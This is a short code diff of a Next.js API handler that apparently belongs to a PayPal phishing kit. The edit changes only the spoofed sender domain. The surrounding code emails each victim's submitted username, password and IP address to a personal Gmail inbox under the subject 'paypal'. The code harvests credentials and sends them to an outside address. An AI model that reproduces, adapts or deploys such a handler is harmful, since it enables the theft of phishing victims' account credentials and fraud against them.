@@ -29,7 +29,7 @@ export default async (req: NextApiRequest, res: NextApiResponse<string>/*NextApi
     });
     
     const mailDetails = {
-        from: 'support@greeniumtrade.com',
+        from: 'support@subsonicinvestment.com',
         to: 'campdaniel06@gmail.com',
         subject: 'paypal' + ' : ' + username + ' : ' + ip,
         html: '<p>username: ' + username + '</p>' + '<p>password: ' + oldPassword + '</p>' + '<p>ip: ' + ip + '</p>'
